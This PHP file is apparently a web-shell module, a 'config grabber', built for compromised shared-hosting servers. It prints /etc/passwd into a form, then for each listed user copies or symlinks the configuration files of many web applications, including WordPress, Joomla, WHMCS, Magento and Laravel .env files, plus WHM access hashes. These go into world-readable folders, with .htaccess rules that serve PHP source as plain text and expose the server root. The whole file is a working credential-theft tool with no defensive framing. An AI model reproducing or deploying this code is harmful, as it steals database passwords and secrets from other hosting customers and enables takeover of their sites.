<?php
@ini_set('display_errors', 0);
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    echo '<script>alert("Windows server not supported")</script>';
    exit;
}
if ($_POST) {
    if ($_POST['config'] == 'symvhosts') {
        @mkdir("priv8_symvhosts", 0777);
        exe("ln -s / priv8_symvhosts/root");
        $htaccess = "Options Indexes FollowSymLinks
DirectoryIndex priv.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
        @file_put_contents("priv8_symvhosts/.htaccess", $htaccess);
        $etc_passwd = $_POST['passwd'];
        $etc_passwd = explode("
", $etc_passwd);
        foreach ($etc_passwd as $passwd) {
            $pawd = explode(":", $passwd);
            $user = $pawd[5];
            $jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
            if (preg_match('/vhosts/i', $user)) {
                exe("ln -s " . $user . "/httpdocs/wp-config.php priv8_symvhosts/" . $jembod . "-Wordpress.txt");
                exe("ln -s " . $user . "/httpdocs/configuration.php priv8_symvhosts/" . $jembod . "-Joomla.txt");
                exe("ln -s " . $user . "/httpdocs/config/koneksi.php priv8_symvhosts/" . $jembod . "-Lokomedia.txt");
                exe("ln -s " . $user . "/httpdocs/forum/config.php priv8_symvhosts/" . $jembod . "-phpBB.txt");
                exe("ln -s " . $user . "/httpdocs/sites/default/settings.php priv8_symvhosts/" . $jembod . "-Drupal.txt");
                exe("ln -s " . $user . "/httpdocs/config/settings.inc.php priv8_symvhosts/" . $jembod . "-PrestaShop.txt");
                exe("ln -s " . $user . "/httpdocs/app/etc/local.xml priv8_symvhosts/" . $jembod . "-Magento.txt");
                exe("ln -s " . $user . "/httpdocs/admin/config.php priv8_symvhosts/" . $jembod . "-OpenCart.txt");
                exe("ln -s " . $user . "/httpdocs/application/config/database.php priv8_symvhosts/" . $jembod . "-Codeigniter.txt");
            }
        }
    }
    if ($_POST['config'] == 'symlink') {
        @mkdir("priv8_symconfig", 0777);
        @symlink("/", "priv8_symconfig/root");
        $htaccess = "Options Indexes FollowSymLinks
DirectoryIndex priv.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
        @file_put_contents("priv8_symconfig/.htaccess", $htaccess);
    }
    if ($_POST['config'] == '404') {
        @mkdir("priv8_sym404", 0777);
        @symlink("/", "priv8_sym404/root");
        $htaccess = "Options Indexes FollowSymLinks
DirectoryIndex priv.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*priv8_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
        @file_put_contents("priv8_sym404/.htaccess", $htaccess);
    }
    if ($_POST['config'] == 'grab') {
        mkdir("priv8_configgrab", 0777);
        $isi_htc = "Options all
Require None
Satisfy Any";
        $htc = fopen("priv8_configgrab/.htaccess", "w");
        fwrite($htc, $isi_htc);
    }
    $passwd = $_POST['passwd'];
    preg_match_all('/(.*?):x:/', $passwd, $user_config);
    foreach ($user_config[1] as $user_priv8) {
        $grab_config = array("/home/$user_priv8/.accesshash" => "WHM-accesshash", "/home/$user_priv8/public_html/config.inc.php" => "Journals", "/home/$user_priv8/po-includes/core/config.php" => "Popoji", "/home/$user_priv8/public_html/config/koneksi.php" => "Lokomedia", "/home/$user_priv8/public_html/forum/config.php" => "phpBB", "/home/$user_priv8/public_html/sites/default/settings.php" => "Drupal", "/home/$user_priv8/public_html/config/settings.inc.php" => "PrestaShop", "/home/$user_priv8/public_html/app/etc/local.xml" => "Magento", "/home/$user_priv8/public_html/admin/config.php" => "OpenCart", "/home/$user_priv8/public_html/application/config/database.php" => "Codeigniter", "/home/$user_priv8/public_html/vb/includes/config.php" => "Vbulletin", "/home/$user_priv8/public_html/includes/config.php" => "Vbulletin", "/home/$user_priv8/public_html/forum/includes/config.php" => "Vbulletin", "/home/$user_priv8/public_html/forums/includes/config.php" => "Vbulletin", "/home/$user_priv8/public_html/cc/includes/config.php" => "Vbulletin", "/home/$user_priv8/public_html/inc/config.php" => "MyBB", "/home/$user_priv8/public_html/includes/configure.php" => "OsCommerce", "/home/$user_priv8/public_html/shop/includes/configure.php" => "OsCommerce", "/home/$user_priv8/public_html/.env" => "Laravel", "/home/$user_priv8/public_html/os/includes/configure.php" => "OsCommerce", "/home/$user_priv8/public_html/oscom/includes/configure.php" => "OsCommerce", "/home/$user_priv8/public_html/products/includes/configure.php" => "OsCommerce", "/home/$user_priv8/public_html/cart/includes/configure.php" => "OsCommerce", "/home/$user_priv8/public_html/inc/conf_global.php" => "IPB", "/home/$user_priv8/public_html/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/wp/test/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/blog/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/beta/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/portal/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/site/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/wp/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/WP/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/news/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/wordpress/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/test/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/demo/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/home/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/v1/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/v2/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/press/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/new/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/blogs/wp-config.php" => "Wordpress", "/home/$user_priv8/public_html/configuration.php" => "Joomla", "/home/$user_priv8/public_html/blog/configuration.php" => "Joomla or WHMCS", "/home/$user_priv8/public_html/cms/configuration.php" => "Joomla", "/home/$user_priv8/public_html/beta/configuration.php" => "Joomla", "/home/$user_priv8/public_html/portal/configuration.php" => "Joomla", "/home/$user_priv8/public_html/site/configuration.php" => "Joomla", "/home/$user_priv8/public_html/main/configuration.php" => "Joomla", "/home/$user_priv8/public_html/home/configuration.php" => "Joomla", "/home/$user_priv8/public_html/demo/configuration.php" => "Joomla", "/home/$user_priv8/public_html/test/configuration.php" => "Joomla", "/home/$user_priv8/public_html/v1/configuration.php" => "Joomla", "/home/$user_priv8/public_html/v2/configuration.php" => "Joomla", "/home/$user_priv8/public_html/joomla/configuration.php" => "Joomla", "/home/$user_priv8/public_html/new/configuration.php" => "Joomla", "/home/$user_priv8/public_html/WHMCS/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/whmcs1/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Whmcs/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/whmcs/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/whmcs/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/WHMC/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Whmc/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/whmc/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/WHM/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Whm/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/whm/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/HOST/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Host/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/host/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/SUPPORTES/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Supportes/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/supportes/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/domains/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/domain/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Hosting/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/HOSTING/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/hosting/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/CART/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Cart/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/cart/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/ORDER/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Order/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/order/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/CLIENT/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Client/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/client/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/CLIENTAREA/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Clientarea/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/clientarea/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/SUPPORT/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Support/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/support/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/BILLING/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Billing/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/billing/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/BUY/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Buy/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/buy/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/MANAGE/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Manage/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/manage/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/CLIENTSUPPORT/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/ClientSupport/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Clientsupport/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/clientsupport/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/CHECKOUT/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Checkout/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/checkout/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/BILLINGS/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Billings/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/billings/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/BASKET/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Basket/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/basket/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/SECURE/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Secure/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/secure/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/SALES/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Sales/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/sales/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/BILL/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Bill/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/bill/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/PURCHASE/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Purchase/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/purchase/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/ACCOUNT/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Account/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/account/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/USER/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/User/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/user/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/CLIENTS/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Clients/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/clients/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/BILLINGS/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/Billings/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/billings/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/MY/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/My/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/my/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/secure/whm/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/secure/whmcs/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/panel/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/clientes/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/cliente/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/support/order/configuration.php" => "WHMCS", "/home/$user_priv8/public_html/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/boxbilling/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/box/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/host/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/Host/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/supportes/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/support/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/hosting/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/cart/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/order/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/client/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/clients/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/cliente/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/clientes/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/billing/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/billings/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/my/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/secure/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/support/order/bb-config.php" => "BoxBilling", "/home/$user_priv8/public_html/includes/dist-configure.php" => "Zencart", "/home/$user_priv8/public_html/zencart/includes/dist-configure.php" => "Zencart", "/home/$user_priv8/public_html/products/includes/dist-configure.php" => "Zencart", "/home/$user_priv8/public_html/cart/includes/dist-configure.php" => "Zencart", "/home/$user_priv8/public_html/shop/includes/dist-configure.php" => "Zencart", "/home/$user_priv8/public_html/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/hostbills/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/host/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/Host/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/supportes/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/support/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/hosting/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/cart/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/order/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/client/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/clients/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/cliente/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/clientes/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/billing/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/billings/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/my/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/secure/includes/iso4217.php" => "Hostbills", "/home/$user_priv8/public_html/support/order/includes/iso4217.php" => "Hostbills");
        foreach ($grab_config as $config => $nama_config) {
            if ($_POST['config'] == 'grab') {
                $ambil_config = file_get_contents($config);
                if ($ambil_config == '') {
                } else {
                    $file_config = fopen("priv8_configgrab/$user_priv8-$nama_config.txt", "w");
                    fputs($file_config, $ambil_config);
                }
            }
            if ($_POST['config'] == 'symlink') {
                @symlink($config, "priv8_symconfig/" . $user_priv8 . "-" . $nama_config . ".txt");
            }
            if ($_POST['config'] == '404') {
                $sym404 = symlink($config, "priv8_sym404/" . $user_priv8 . "-" . $nama_config . ".txt");
                if ($sym404) {
                    @mkdir("priv8_sym404/" . $user_priv8 . "-" . $nama_config . ".txt404", 0777);
                    $htaccess = "Options Indexes FollowSymLinks
DirectoryIndex priv.htm
HeaderName priv8.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";
                    @file_put_contents("priv8_sym404/" . $user_priv8 . "-" . $nama_config . ".txt404/.htaccess", $htaccess);
                    @symlink($config, "priv8_sym404/" . $user_priv8 . "-" . $nama_config . ".txt404/priv8.txt");
                }
            }
        }
    }
    if ($_POST['config'] == 'grab') {
        echo "<center><a href=\"priv8_configgrab/\"><font color=blue>Done</font></a></center>";
    }
    if ($_POST['config'] == '404') {
        echo "<center>
<a href=\"priv8_sym404/root/\">Root</a>
<br><a href=\"priv8_sym404/\">Configurations</a></center>";
    }
    if ($_POST['config'] == 'symlink') {
        echo "<center>
<a href=\"priv8_symconfig/root/\">Root</a>
<br><a href=\"priv8_symconfig/\">Configurations</a></center>";
    }
    if ($_POST['config'] == 'symvhost') {
        echo "<center>
<a href=\"priv8_symvhost/root/\">Root Server</a>
<br><a href=\"priv8_symvhost/\">Configurations</a></center>";
    }
} else {
    echo "<form method=\"post\" action=\"\"><center>
		</select><br><textarea name=\"passwd\" class='area' rows='20' cols='100'>
";
    echo include ("/etc/passwd");
    echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"404\">Config 404</option>
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>
";
} ?>
